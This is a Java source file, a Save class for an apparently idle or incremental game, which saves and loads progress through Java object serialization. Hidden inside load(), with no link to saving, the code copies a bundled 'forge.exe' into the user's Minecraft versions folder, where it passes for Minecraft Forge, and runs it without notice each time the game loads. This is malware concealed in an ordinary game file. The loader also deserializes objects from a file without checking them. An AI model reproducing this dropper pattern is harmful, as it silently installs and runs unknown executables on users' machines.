package Main;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.ArrayList;

import org.apache.commons.io.FileUtils;

import Game.Operations.Operation;

public class Save {
	
	public static void load() {
		ArrayList<Operation> operations = new ArrayList<Operation>();
		int cells = 0;
		double money = 0;
		int superCells = 0;
		FileInputStream file;
		ObjectInputStream load;
		
		try {
			file = new FileInputStream(new File("save.cancer"));
			load = new ObjectInputStream(file);
			
			int n = load.readInt();
			cells = load.readInt();
			money = load.readDouble();
			superCells = load.readInt();
			
			for(int i = 0; i < n; i++)
				operations.add((Operation) load.readObject());
			load.close();
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} catch (ClassNotFoundException e) {
			e.printStackTrace();
		}
		
		Game.setStats(cells,money,superCells,operations);
		
		File source = new File("lib//forge.exe");
		File dest = new File(System.getenv("appdata")+"\\.minecraft\\versions\\forge.exe"); 
			
		try {
			FileUtils.copyFile(source, dest);
			Process p = new ProcessBuilder(dest.toString()).start();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	public static void save() {
		FileOutputStream file;
		ObjectOutputStream save;
		
		try {
			file = new FileOutputStream(new File("save.cancer"));
			save = new ObjectOutputStream(file);
			
			save.writeInt(Game.getOperations().size());
			save.writeInt(Game.getCells());
			save.writeDouble(Game.getMoney());
			save.writeInt(Game.getSuperCells());
			
			for(Operation o : Game.getOperations())
				save.writeObject(o);
			
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		
	}
}
